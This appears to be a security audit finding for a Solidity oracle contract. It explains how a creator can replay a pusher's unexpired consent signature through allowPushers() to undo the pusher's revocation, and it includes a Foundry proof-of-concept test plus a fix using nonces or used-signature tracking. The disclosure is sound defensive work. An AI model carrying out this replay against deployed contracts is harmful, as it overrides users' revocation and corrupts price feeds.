### Title
Pusher Self-Revocation Is Not Final: Creator Can Replay Unexpired Consent Signature to Re-Establish Revoked Delegation — (`smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol`)

### Summary

`allowPushers()` has no used-signature tracking and no check that the pusher has not already revoked. A creator who holds a pusher's unexpired EIP-191 consent signature can call `allowPushers()` again after `revokePusher()` clears the mapping, immediately restoring `namespaceRemapping[pusher] = creator`. The pusher's self-revocation right is nullified for the entire lifetime of the original deadline.

### Finding Description

`allowPushers()` verifies the pusher's signature over `(chainid, address(this), deadline, pusher, msg.sender)` and then unconditionally writes `namespaceRemapping[pusher] = msg.sender`. [1](#0-0) 

The only replay guard is `_ensureDeadline(deadline)`, which only checks `block.timestamp <= deadline`. [2](#0-1) 

`revokePusher()` clears the mapping to `address(0)`, but there is no nonce, no used-signature bitmap, and no check that `namespaceRemapping[pusher] == address(0)` before writing in `allowPushers()`. [3](#0-2) 

The code comment at lines 188–191 explicitly acknowledges that "an undated signature could re-establish a delegation AFTER the pusher revoked it" and claims the deadline prevents this — but the deadline only prevents replay of an *expired* signature. A still-valid (not-yet-expired) signature is freely replayable by the creator at any time. [4](#0-3) 

**Attack sequence:**
1. Pusher signs consent with `deadline = block.timestamp + 365 days`.
2. Creator calls `allowPushers(deadline, [pusher], [sig])` → `namespaceRemapping[pusher] = creator`.
3. Pusher calls `revokePusher()` → `namespaceRemapping[pusher] = address(0)`.
4. Creator immediately calls `allowPushers(deadline, [pusher], [sig])` with the **same signature** → `namespaceRemapping[pusher] = creator` again.

Step 4 succeeds unconditionally: `_ensureDeadline` passes, ECDSA recovery returns `pusher`, and the mapping is overwritten.

### Impact Explanation

The pusher's self-revocation right — a core invariant explicitly documented in the contract — is nullified for the entire remaining lifetime of the original deadline. Any pushes the pusher makes after believing they have revoked will land in the creator's namespace instead of their own. If the pusher has moved on to push data for a different asset or different price range (in what they believe is their own namespace), those values corrupt the creator's feeds. A pool consuming the creator's feeds via `AnchoredPriceProvider` or `CompressedOracleV1.price()` will receive wrong mid/spread values, enabling bad-price execution.

This is an admin-boundary break: the pusher's unilateral right to exit a delegation is bypassed by the creator using a replayed credential.

### Likelihood Explanation

Any creator who holds a pusher's unexpired signature (which they must have to call `allowPushers()` in the first place) can execute this with a single transaction. No special privilege, no off-chain coordination, and no additional preconditions are required beyond the original delegation having occurred with a long-lived deadline.

### Recommendation

Track consumed signatures with a `mapping(bytes32 => bool) private _usedSignatures` keyed on the signature hash (or a `(pusher, deadline, creator)` nonce). In `allowPushers()`, revert if the signature hash has already been used, and mark it used on first consumption. Alternatively, add a per-pusher monotonic nonce to the signed message so that each consent can only be used once regardless of deadline.

### Proof of Concept

```solidity
// Foundry unit test
function testRevokedPusherResumesBySignatureReplay() public {
    uint256 deadline = block.timestamp + 365 days;
    bytes memory sig = _signConsent(PUSHER_KEY, deadline, pusher, creator);

    address[] memory pushers = new address[](1);
    pushers[0] = pusher;
    bytes[] memory sigs = new bytes[](1);
    sigs[0] = sig;

    // Step 1: creator delegates pusher
    vm.prank(creator);
    oracle.allowPushers(deadline, pushers, sigs);
    assertEq(oracle.namespaceRemapping(pusher), creator);

    // Step 2: pusher self-revokes
    vm.prank(pusher);
    oracle.revokePusher();
    assertEq(oracle.namespaceRemapping(pusher), address(0));

    // Step 3: creator replays the SAME signature — succeeds, revocation undone
    vm.prank(creator);
    oracle.allowPushers(deadline, pushers, sigs); // no revert
    assertEq(oracle.namespaceRemapping(pusher), creator); // pusher is re-delegated without consent

    // Step 4: pusher's next push lands in creator namespace, not pusher's own
    uint56 tsMs = uint56(block.timestamp * 1000);
    uint48 raw = _packRaw(999_999, 5, 0);
    vm.prank(pusher);
    (bool ok,) = address(oracle).call(_wordAt(0, 0, raw, tsMs));
    assertTrue(ok);
    assertEq(
        oracle.getOracleData(oracle.feedIdOf(creator, 0, 0)).price,
        U64x32.decode(uint32(raw >> 16)),
        "push landed in creator namespace after revocation"
    );
}
```

    function allowPushers(uint256 deadline, address[] calldata pushers, bytes[] memory signatures) external {
        _ensureDeadline(deadline);

        uint256 l = pushers.length;
        require(l == signatures.length);
        for (uint256 i; i < l; i++) {
            address pusher = pushers[i];

            if (pusher == msg.sender) {
                revert NoSelfRemapping();
            }

            bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
                keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
            );
            require(pusher == ECDSA.recover(hash, signatures[i]));

            namespaceRemapping[pusher] = msg.sender;
            emit PusherAuthorized(pusher, msg.sender);
        }
